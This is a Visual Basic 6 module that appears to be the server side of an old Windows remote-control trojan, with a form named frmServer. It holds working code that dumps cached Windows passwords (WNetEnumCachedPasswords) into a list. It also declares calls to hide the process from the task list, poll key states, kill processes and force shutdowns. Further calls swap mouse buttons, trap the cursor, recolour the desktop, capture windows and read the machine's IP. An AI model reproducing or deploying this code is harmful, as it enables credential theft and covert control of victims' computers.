Attribute VB_Name = "Module1"
Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Declare Sub mouse_event Lib "USER32" (ByVal dwFlags As Long, ByVal dX As Long, ByVal dy As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long)

Declare Function GetSystemMenu Lib "USER32" (ByVal hwnd As Integer, _
ByVal bRevert As Integer) As Integer

Declare Function RemoveMenu Lib "USER32" (ByVal hMenu As Integer, _
ByVal nPosition As Integer, ByVal wFlags As Integer) As Integer

Declare Function RegisterServiceProcess Lib "kernel32.dll" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long

Declare Function WritePrivateProfileString Lib "kernel32" _
Alias "WritePrivateProfileStringA" (ByVal lpApplicationname As String, _
ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long

Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationname As String, ByVal lpKeyName As String, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long

Private Declare Function GetShortPathName Lib "kernel32" Alias _
"GetShortPathNameA" (ByVal lpszLongPath As String, ByVal _
lpszShortPath As String, ByVal lBuffer As Long) As Long

Declare Function WNetEnumCachedPasswords Lib "mpr.dll" (ByVal S As String, ByVal i As Integer, ByVal b As Byte, ByVal proc As Long, ByVal L As Long) As Long
'this structure is returned by the call to WNetEnumCachedPasswords
Type PASSWORD_CACHE_ENTRY
    cbEntry As Integer              'size of this returned structure in bytes
    cbResource As Integer           'size of the resource string, in bytes
    cbPassword As Integer           'size of the password string, in bytes
    iEntry As Byte                  'entry position in PWL file
    nType As Byte                   'type of entry
    abResource(1 To 1024) As Byte   'buffer to hold resource string, followed by password string
                                    'should this be bigger?
End Type

Public Declare Function EnumWindows Lib "USER32" (ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
Public Declare Function IsWindowVisible Lib "USER32" (ByVal hwnd As Long) As Long
Public Declare Function GetWindow Lib "USER32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Public Declare Function GetParent Lib "USER32" (ByVal hwnd As Long) As Long
Public Declare Function GetWindowTextLength Lib "USER32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function GetWindowText Lib "USER32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function SendMessage Lib "USER32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function FindWindow Lib "USER32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function ShowWindow Lib "USER32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function SetWindowText Lib "USER32" Alias "SetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String) As Long
Public Declare Function PostMessage Lib "USER32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function SetActiveWindow Lib "USER32" (ByVal hwnd As Long) As Long

Public Const WM_CLOSE = &H10
Public Const WM_DESTROY = &H2
Public Const WM_QUIT = &H12
Public Const WM_ENDSESSION = &H16
Public Const WM_SETTEXT = &HC
Public Const WM_SIZE = &H5


Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDNEXT = 2
Public Const GW_CHILD = 5

Public Const SW_HIDE = 0
Public Const SW_SHOW = 5
Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_RESTORE = 9
Public Const SW_SHOWDEFAULT = 10

'Constant used to determine window owner.
Private Const GWL_HWNDPARENT = (-8)

'Listbox messages
Private Const LB_ADDSTRING = &H180
Private Const LB_SETITEMDATA = &H19A

Declare Function CreateToolhelp32Snapshot& Lib "kernel32" (ByVal lFlags As Long, ByVal lProcessID As Long)
Declare Function Process32First& Lib "kernel32" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32)
Declare Function Process32Next& Lib "kernel32" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32)
Declare Function GetFileTitle% Lib "comdlg32" Alias "GetFileTitleA" (ByVal lpszFile As String, ByVal lpszTitle As String, ByVal cbBuf As Integer)
Declare Function DestroyWindow& Lib "USER32" (ByVal hwnd As Long)
Declare Function GetPriorityClass& Lib "kernel32" (ByVal hProcess As Long)
Declare Function SetPriorityClass& Lib "kernel32" (ByVal hProcess As Long, ByVal dwPriorityClass As Long)
Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Declare Function TerminateProcess& Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long)

Public Type PROCESSENTRY32
 dwSize As Long
 cntUsage As Long
 th32ProcessID As Long
 th32DefaultHeapID As Long
 th32ModuleID As Long
 cntThreads As Long
 th32ParentProcessID As Long
 pcPriClassBase As Long
 dwFlags As Long
 szExeFile As String * 260
End Type

Public Const TH32CS_SNAPPROCESS = 2

Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Const SW_NORMAL = 1

Declare Function ExitWindowsEx Lib "USER32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Public Const EWX_LOGOFF = 0
Public Const EWX_SHUTDOWN = 1
Public Const EWX_REBOOT = 2
Public Const EWX_FORCE = 4

Private Declare Function StartDocPrinter Lib "winspool.drv" Alias "StartDocPrinterA" (ByVal hPrinter As Long, ByVal level As Long, pDocInfo As DOCINFO) As Long
Private Declare Function EndDocPrinter Lib "winspool.drv" (ByVal hPrinter As Long) As Long
Private Declare Function EndPagePrinter Lib "winspool.drv" (ByVal hPrinter As Long) As Long
Private Declare Function StartPagePrinter Lib "winspool.drv" (ByVal hPrinter As Long) As Long
Private Declare Function WritePrinter Lib "winspool.drv" (ByVal hPrinter As Long, pBuf As Any, ByVal cdBuf As Long, pcWritten As Long) As Long
Private Declare Function OpenPrinter Lib "winspool.drv" Alias "OpenPrinterA" (ByVal pPrinterName As String, phPrinter As Long, pDefault As Any) As Long
Private Declare Function ClosePrinter Lib "winspool.drv" (ByVal hPrinter As Long) As Long

Private Type DOCINFO
    pDocName As String
    pOutputFile As String
    pDatatype As String
End Type

Declare Function SetSysColors Lib "USER32" _
(ByVal nChanges As Long, lpSysColor As _
Long, lpColorValues As Long) As Long

Public Const COLOR_BACKGROUND = 1
Public Const COLOR_MENU = 4
Public Const COLOR_WINDOW = 5
Public Const COLOR_WINDOWTEXT = 8
Public Const COLOR_BTNFACE = 15

Declare Function SetDoubleClickTime Lib "USER32" (ByVal wCount As Long) As Long
Declare Function SwapMouseButton& Lib "USER32" (ByVal bSwap As Long)
Declare Function ClipCursor Lib "USER32" (lpRect As Any) As Long
Declare Function SetCursorPos Lib "USER32" (ByVal x As Long, ByVal y As Long) As Long
Private Declare Function WinExec Lib "kernel32" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long

Declare Function SetWindowPos Lib "USER32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long

Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const flags = SWP_NOMOVE Or SWP_NOSIZE

Declare Function GetForegroundWindow Lib "user32.dll" () As Long
Declare Function GetAsyncKeyState Lib "USER32" (ByVal vKey As Long) As Integer
Declare Function GetKeyState Lib "USER32" (ByVal nVirtKey As Long) As Integer

Declare Function CreateDC& Lib "gdi32" Alias "CreateDCA" (ByVal lpDriverName As String, ByVal lpDeviceName As String, ByVal lpOutput As String, ByVal lpInitData As Any)
Declare Function CreateCompatibleBitmap Lib "gdi32" (ByVal hdc As Long, ByVal nWidth As Long, ByVal nHeight As Long) As Long
Declare Function CreateCompatibleDC Lib "gdi32" (ByVal hdc As Long) As Long
Declare Function DeleteObject& Lib "gdi32" (ByVal hObject As Long)
Declare Function SelectObject Lib "gdi32" (ByVal hdc As Long, ByVal hObject As Long) As Long
Declare Function GetWindowRect& Lib "USER32" (ByVal hwnd As Long, lpRect As RECT)
Public Type RECT
 Left As Long
 Top As Long
 Right As Long
 Bottom As Long
End Type

Public Type HOSTENT
    hName As Long
    hAliases As Long
    hAddrType As Integer
    hLength As Integer
    hAddrList As Long
End Type

Public Const Delimiter = "©" 'ascii 169

Declare Sub RtlMoveMemory Lib "kernel32" (hpvDest As Any, ByVal hpvSource&, ByVal cbCopy&)

'Private variables needed to support enumeration
Private m_hWnd As Long
Public Filling As Integer

Public Function GetShortPath(strFileName As String) As String
Dim lngRes As Long
Dim strPath As String

strPath = String$(165, 0)
lngRes = GetShortPathName(strFileName, strPath, 164)
GetShortPath = Left$(strPath, lngRes)

End Function

'callback routine for WNetEnumCachedPasswords results
Public Function callback(x As PASSWORD_CACHE_ENTRY, ByVal lSomething As Long) As Integer
Dim nLoop As Integer
Dim cString As String
Dim ccomputer
Dim Resource As String
Dim ResType As String
Dim Password As String
    
    ResType = x.nType
    '1 = domains
    '4 = mail/mapi clients
    '6 = RAS entries
    '19 = iexplorer entries
    For nLoop = 1 To x.cbResource

        If x.abResource(nLoop) <> 0 Then
            cString = cString & Chr(x.abResource(nLoop))
        Else
            cString = cString & " "
        End If

    Next

    Resource = cString
    cString = ""

    For nLoop = x.cbResource + 1 To (x.cbResource + x.cbPassword)

        If x.abResource(nLoop) <> 0 Then
            cString = cString & Chr(x.abResource(nLoop))
        Else
            cString = cString & " "
        End If

    Next

    Password = cString & "          Type:" & x.nType
    cString = ""
    
    frmServer.List1.AddItem Resource
    frmServer.List1.AddItem Password

    callback = True
End Function

Public Sub GetPasswords()
    Dim nLoop As Integer
    Dim cString As String
    Dim lLong As Long
    Dim bByte As Byte
    
    bByte = &HFF
    nLoop = 0
    lLong = 0
    cString = ""
    frmServer.List1.Clear
    Call WNetEnumCachedPasswords(cString, nLoop, bByte, AddressOf callback, lLong)
End Sub

Function GetShortFileTitle$(ByVal FName$)
Dim Buffer As String

Buffer = Space(255)
n = GetFileTitle(FName, Buffer, 255)
GetShortFileTitle = StripNulls(Buffer)
End Function

'search for first null and return everything before it
Function StripNulls$(ByVal TempStr$)
'get location of null
n% = InStr(TempStr, Chr(0))
'If one exists, remove all after it; otherwise return string unchanged.
If n > 0 Then
 StripNulls = Left(TempStr, InStr(TempStr, Chr(0)) - 1)
Else
 StripNulls = TempStr
End If
End Function

Sub SetPriority(ByVal ProcId&, ByVal Prio%)
'create link to process
lprocesshandle = OpenProcess(0, 0, ProcId)
'on error exit
If lprocesshandle = 0 Then Exit Sub
'set priority
SetPriorityClass lprocesshandle, Prio
'disconnect link
CloseHandle lprocesshandle
End Sub

Function GetPriority%(ByVal ProcId&)
'creates link to process
lprocesshandle = OpenProcess(0, 0, ProcId)
'on error return error code & exit
If lprocesshandle = 0 Then GetPriority = 0: Exit Function
'get the priority
GetPriority = GetPriorityClass(lprocesshandle)
'disconnect link
CloseHandle lprocesshandle
End Function

Public Sub PrintText(Text As String)
Dim lPrinter As Long
Dim lRet As Long
Dim lDoc As Long
Dim udtDocInfo As DOCINFO
Dim lWritten As Long

lRet = OpenPrinter(Printer.DeviceName, lPrinter, 0)
If lRet = 0 Then
    Exit Sub
End If

udtDocInfo.pDocName = "-"
udtDocInfo.pOutputFile = vbNullString
udtDocInfo.pDatatype = vbNullString
lDoc = StartDocPrinter(lPrinter, 1, udtDocInfo)
Call StartPagePrinter(lPrinter)
lRet = WritePrinter(lPrinter, ByVal Text, Len(Text), lWritten)
lRet = EndPagePrinter(lPrinter)
lRet = EndDocPrinter(lPrinter)
lRet = ClosePrinter(lPrinter)
End Sub

Public Sub RunScrSaver()
Call WinExec("3D Text.SCR -s", SW_SHOWDEFAULT)
End Sub

Public Sub StayOnTop(TheForm As Form)
SetWinOnTop = SetWindowPos(TheForm.hwnd, HWND_TOPMOST, 0, 0, 0, 0, flags)
End Sub

Public Function GetCapslock() As Boolean
GetCapslock = CBool(GetKeyState(vbKeyCapital) And 1)
End Function

Public Function GetShift() As Boolean
GetShift = CBool(GetAsyncKeyState(vbKeyShift))
End Function

Public Function FillTaskListBox(lst As ListBox) As Long
   'Fill an array with the current running Tasks
   lst.Clear
   Call EnumWindows(AddressOf EnumWindowsProc, lst.hwnd)
   FillTaskListBox = lst.ListCount
End Function

Private Function EnumWindowsProc(ByVal hwnd As Long, ByVal lParam As Long) As Long
   Static WindowText As String
   Static nRet As Long
   
   If IsWindowVisible(hwnd) Then
      'It shouldn't have any parent window, either.
      If GetParent(hwnd) = 0 Then
         'And, finally, it shouldn't have an owner.
         If GetWindowLong(hwnd, GWL_HWNDPARENT) = 0 Then
            'Retrieve windowtext (caption)
            WindowText = Space$(256)
            nRet = GetWindowText(hwnd, WindowText, Len(WindowText))
            If nRet Then
               WindowText = Left$(WindowText, nRet)
               If WindowText <> frmServer.Caption Then
                  nRet = SendMessage(lParam, LB_ADDSTRING, 0, ByVal WindowText)
                  Call SendMessage(lParam, LB_SETITEMDATA, nRet, ByVal hwnd)
               End If
            End If
         End If
      End If
   End If
   'Return True to continue enumeration.
   EnumWindowsProc = True
End Function

Public Function CurrentIP(ReturnExternalIP As Boolean) As String
Dim hostname As String * 256
Dim hostent_addr As Long
Dim host As HOSTENT
Dim hostip_addr As Long
Dim temp_ip_address() As Byte
Dim i As Integer
Dim ip_address As String
Dim IP As String

    If gethostname(hostname, 256) = SOCKET_ERROR Then
       Exit Function
    Else
       hostname = Trim$(hostname)
    End If
    hostent_addr = gethostbyname(hostname)

    If hostent_addr = 0 Then
       Exit Function
    End If
    RtlMoveMemory host, hostent_addr, LenB(host)
    RtlMoveMemory hostip_addr, host.hAddrList, 4
   
    Do
        ReDim temp_ip_address(1 To host.hLength)
        RtlMoveMemory temp_ip_address(1), hostip_addr, host.hLength

        For i = 1 To host.hLength
            ip_address = ip_address & temp_ip_address(i) & "."
        Next
        ip_address = Mid$(ip_address, 1, Len(ip_address) - 1)
    
        Internal = TheIP        ' Send ONLY the External IP to the CurrentIP Function
        External = ip_address   ' Send the External IP to the  function parameter External
        TheIP = ip_address      ' Send LAN IP to the function para Internal

        ip_address = ""
        host.hAddrList = host.hAddrList + LenB(host.hAddrList)
        RtlMoveMemory hostip_addr, host.hAddrList, 4
    Loop While (hostip_addr <> 0)
    
If ReturnExternalIP = True Then
    CurrentIP = External
Else
    CurrentIP = Internal
End If
End Function

Public Function GetDrive(Letter As String) As String

If GetDriveType(UCase(Letter) & "\") = DRIVE_REMOVABLE Then
   GetDrive = "Floppy___|" '10 characters for easy check
ElseIf GetDriveType(UCase(Letter) & "\") = DRIVE_FIXED Then
   GetDrive = "HardDrive|"
ElseIf GetDriveType(UCase(Letter) & "\") = DRIVE_CDROM Then
   GetDrive = "CDROM____|"
Else
   GetDrive = "Unknown__|"
End If

End Function
